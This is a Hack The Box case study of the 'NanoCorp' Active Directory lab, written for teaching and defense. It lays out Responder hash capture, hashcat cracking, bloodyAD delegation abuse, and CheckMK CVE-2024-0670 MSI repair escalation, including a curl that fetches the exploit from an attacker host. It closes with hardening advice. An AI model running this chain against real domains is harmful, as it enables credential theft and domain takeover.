---
title: "NanoCorp — NTLM Relay Chain to Domain Dominance via MSI Repair Abuse"
description: "A zip-upload SSRF captures an NTLMv2 hash, and delegation abuse plus an MSI repair flaw create a domain administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ntlm-relay
  - responder
  - bloodhound
  - cve-2024-0670
  - checkmk
  - privilege-escalation
objective: "Malicious zip SMB callback to NTLMv2 crack and CheckMK CVE-2024-0670 abuse"
tools:
  - rustscan
  - gobuster
  - Responder
  - hashcat
  - rusthound-ce
  - bloodyAD
  - nxc
  - RunasCs
  - evil-winrm
skill: "AD delegation chain abuse and MSI repair privilege escalation"
outcome: "Administrative control"
---

## Summary

NanoCorp is a Hard-rated Hack The Box Windows Active Directory lab that chains a zip-upload SSRF vulnerability to NTLM hash capture, weak service-account credentials, overly permissive AD delegation, and a CheckMK MSI repair privilege escalation (CVE-2024-0670). The recorded chain captures the `web_svc` NTLMv2 hash via Responder, cracks it offline, uses BloodHound to identify an AddSelf → ForceChangePassword escalation path, obtains WinRM access through a compromised service account, and finally exploits CVE-2024-0670 to create a domain administrator. All target addresses, credential values, hostnames, and exploit specifics are replaced with role-based placeholders below.

## Context and Objective

- **Target:** Windows Active Directory domain controller running Apache, Kerberos, LDAP, and WinRM services
- **Services exposed:** DNS (53), HTTP (80), Kerberos (88), MSRPC (135), NetBIOS (139), LDAP (389/3268), SMB (445), WinRM (5986), and others
- **Objective:** Achieve full domain compromise through the attack surface presented by the exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: standard domain controller ports alongside an Apache web server. The DNS, Kerberos, LDAP, and SMB services confirm an Active Directory environment. HTTP on port 80 suggests a web application.

Action: fast TCP scan, then targeted version/script scan of identified ports.

```bash
nmap -p- --min-rate 5000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV -oA <OUT_PREFIX> <TARGET_IP>
```

Representative excerpt (truncated):

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Technical significance: the combination of DNS, Kerberos, LDAP, and SMB on a single host confirms a domain controller. The Apache web server is the primary attack surface.

Result: the recorded output shows a Windows AD domain controller with an HTTP service.

### 2. Web Application Discovery

Observation: subdomain enumeration reveals a virtual host hosting a web application with a zip file upload feature.

Action: virtual host brute-forcing to discover additional subdomains.

```bash
gobuster vhost --url http://<TARGET_HOST> --wordlist <SUBDOMAIN_WORDLIST> --append-domain
```

Representative excerpt (structure only):

```text
Found VHOST: <HIRE_SUBDOMAIN> (Status: 200)
```

Technical significance: the upload handler processes ZIP archives, suggesting a potential path traversal or SSRF vector that could force the server to connect back to the attacker.

Result: the recorded output shows a web application at the hire subdomain with a zip upload feature.

### 3. NTLM Hash Capture via Responder

Observation: crafting a malicious zip file triggers an SMB connection back to the attacker. Responder captures the NTLMv2 hash of the `web_svc` service account running the web application.

Action: start Responder to intercept the SMB callback, then supply the crafted zip through the upload feature.

```bash
responder -I <ATTACKER_INTERFACE>
```

Representative excerpt (identities generalized):

```text
[SMB] NTLMv2-SSP Username : <DOMAIN>\<WEB_SVC_ACCOUNT>
[SMB] NTLMv2-SSP Hash     : <WEB_SVC_ACCOUNT>::<DOMAIN>:<CHALLENGE>:<RESPONSE>
```

Technical significance: the zip upload feature does not validate outbound connection targets, allowing the server to initiate SMB to the attacker. NTLMv2-SSP hashes are crackable offline with standard wordlists.

Result: the recorded output shows an NTLMv2 hash captured for the service account.

### 4. Offline Hash Cracking

Observation: the captured NTLMv2 hash cracks against a common wordlist, revealing a weak service account password.

Action: run hashcat against the captured hash.

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST> -D2
```

Representative excerpt (password redacted):

```text
<DOMAIN>\<WEB_SVC_ACCOUNT>:<CRACKED_PASSWORD>
```

Technical significance: a weak, dictionary-foundable password on a service account means any attacker who captures the hash can authenticate to any service the account uses.

Result: the notes report a cracked credential usable for AD authentication.

### 5. BloodHound Enumeration — AD Attack Path

Observation: with valid credentials, BloodHound reveals a privilege escalation path through AD group nesting and delegation rights.

Action: collect AD data with RustHound, then analyze in BloodHound.

```bash
rusthound-ce --domain <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' --zip -o <OUTPUT_DIR>
```

Representative excerpt (path structure):

```text
<WEB_SVC_ACCOUNT> -> AddSelf -> <IT_SUPPORT_GROUP> -> ForceChangePassword -> <MONITORING_ACCOUNT>
<MONITORING_ACCOUNT> -> WinRM -> <DC_HOSTNAME>
```

Technical significance: the `web_svc` account can add itself to the `IT_Support` group via the `AddSelf` ACE. That group holds `ForceChangePassword` rights over `monitoring_svc`, which has WinRM access to the domain controller. This is a two-hop privilege escalation through misconfigured AD delegation.

Result: the recorded output shows a valid escalation path from service account to domain controller access.

### 6. Active Directory Privilege Abuse — Group Membership and Password Reset

Observation: the `web_svc` account uses its `AddSelf` permission to join the `IT_Support` group, then leverages the group's `ForceChangePassword` right to reset `monitoring_svc`'s password.

Action: add the account to the target group, then reset the target account's password.

```bash
 bloodyAD -H <TARGET_IP> -d <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
   add groupMember '<IT_SUPPORT_GROUP>' '<WEB_SVC_ACCOUNT>'
```

```bash
 bloodyAD -H <TARGET_IP> -d <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
   set password '<MONITORING_ACCOUNT>' '<NEW_PASSWORD>'
```

Representative excerpt:

```text
[+] <WEB_SVC_ACCOUNT> added to <IT_SUPPORT_GROUP>
[+] Password changed successfully!
```

Technical significance: AD delegation permissions allow self-service group membership and password resets without administrative intervention. The `AddSelf` ACE is a common misconfiguration that enables lateral movement through group chaining.

Result: the recorded output shows successful group membership addition and password reset.

### 7. WinRM Access via Compromised Account

Observation: with the reset password, a Kerberos ticket is generated and WinRM session established as `monitoring_svc`.

Action: generate a Kerberos TGT, then authenticate over WinRM.

```bash
kinit <MONITORING_ACCOUNT>
evil-winrm -i <DC_HOSTNAME> -S -r <DOMAIN>
```

Representative excerpt:

```text
<MONITORING_ACCOUNT>@<DOMAIN> PS>
```

Technical significance: WinRM provides a full PowerShell remoting session. The `monitoring_svc` account has sufficient privileges to reach the domain controller, but not domain administrator — further escalation is needed.

Result: the notes report a user-level PowerShell session on the domain controller.

### 8. CVE-2024-0670 — CheckMK MSI Repair Privilege Escalation

Observation: the CheckMK monitoring agent installed on the domain controller is vulnerable to CVE-2024-0670. The MSI repair functionality executes arbitrary batch scripts as SYSTEM during reinstallation, enabling local privilege escalation.

Action: download the exploit script, execute it under the `web_svc` credential via RunasCs, which locates the CheckMK MSI installer in the registry, writes batch scripts that create a new domain user, and triggers a forced MSI repair.

```bash
curl -o <EXPLOIT_SCRIPT> http://<ATTACKER_HOST>:8000/<EXPLOIT_SCRIPT>
./RunasCs.exe '<WEB_SVC_ACCOUNT>' '<CRACKED_PASSWORD>' \
  'powershell -ExecutionPolicy Bypass -File <EXPLOIT_SCRIPT>'
```

Representative excerpt (technique summary — the exploit locates the CheckMK MSI via registry enumeration, writes batch payload files matching the installer's expected naming convention, and triggers `msiexec /fa` for a forced repair):

```text
msiexec.exe /fa "<MSI_PATH>" /qn /l*vx <LOG_PATH>
```

Technical significance: CVE-2024-0670 abuses the MSI repair mechanism's trust relationship — the installer runs as SYSTEM and executes any batch scripts it finds in its temporary staging directory. The exploit writes scripts with randomized filenames across a wide PID range to match whatever naming convention the MSI expects. This converts a low-privileged service account into SYSTEM, which can then create domain administrator accounts.

Result: the recorded output shows the MSI repair triggered successfully.

### 9. Domain Administrator Access

Observation: the newly created user is a member of the local Administrators group, granting full control over the domain controller.

Action: verify group membership and establish a session.

```bash
nxc smb <DC_HOSTNAME> -u '<NEW_ADMIN_ACCOUNT>' -p '<NEW_ADMIN_PASSWORD>' -k
```

Representative excerpt:

```text
[+] <DOMAIN>\<NEW_ADMIN_ACCOUNT>:<NEW_ADMIN_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <DC_HOSTNAME> -u '<NEW_ADMIN_ACCOUNT>' -p '<NEW_ADMIN_PASSWORD>' -S
```

```text
BUILTIN\Administrators   Alias   S-1-5-32-544
```

Technical significance: the `Pwn3d!` indicator and Administrators group membership confirm the new account has full domain control. The domain controller is fully compromised.

Result: the notes report domain administrator access and root flag (flag content omitted).

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| Zip upload SSRF requires outbound SMB | Crafted malicious zip triggering SMB callback to Responder | Web application did not validate outbound connection targets |
| Weak service account password | Cracked offline with standard wordlist | Dictionary-foundable password enabled hash capture exploitation |
| Multi-hop AD escalation needed | Used BloodHound to identify AddSelf → ForceChangePassword path | No direct domain admin from captured credentials; group nesting bridged the gap |
| CVE-2024-0670 exploit requires SYSTEM | Used RunasCs with captured credentials to run exploit under service account context | Exploit writes batch scripts executed during MSI repair in SYSTEM context |

## Outcome

The evidence establishes: initial access via NTLM hash capture from a zip-upload SSRF vulnerability, privilege escalation through AD group delegation abuse, and domain compromise via CVE-2024-0670 MSI repair exploitation. Every step abused a distinct misconfiguration — unvalidated outbound connections in the web application, a weak service account password, overly permissive AD delegation, and an unpatched monitoring agent. The domain controller was fully compromised without exploiting a single CVE in the operating system itself; only the third-party CheckMK agent required a CVE.

## Lessons and Recommendations

1. **Disable outbound SMB from web application servers.** ZIP upload handlers that process archive contents must not initiate outbound SMB or other file-sharing connections. Implement strict URL validation and network egress filtering. (Lesson grounded in this chain.)
2. **Enforce strong passwords for service accounts.** Use managed service accounts (gMSA) where possible and enforce long, random passwords. Service account credentials that crack against common wordlists expose every service they authenticate to. (Lesson grounded in this chain.)
3. **Audit and restrict AD delegation permissions.** `AddSelf` ACEs on security groups allow any permitted account to join the group, which may carry unintended rights like `ForceChangePassword`. Review group membership permissions regularly. (Lesson grounded in this chain.)
4. **Apply vendor patches for third-party monitoring agents.** CVE-2024-0670 in CheckMK was the final escalation vector. Third-party software installed on domain controllers expands the attack surface; keep it patched or remove it if not needed. (Recommendation.)
5. **Segment monitoring agent network access.** Monitoring agents that require elevated installation should be network-segmented from general user traffic and web application servers. (Recommendation.)

## References

- Hack The Box machine **[NanoCorp](https://app.hackthebox.com/machines/NanoCorp)** (retired lab; no active-instance detail)
- CVE-2024-0670: CheckMK MSI repair privilege escalation
- BloodHound / RustHound for Active Directory attack-path enumeration
- `bloodyAD` for Active Directory delegation abuse
- `evil-winrm` for Windows Remote Management sessions
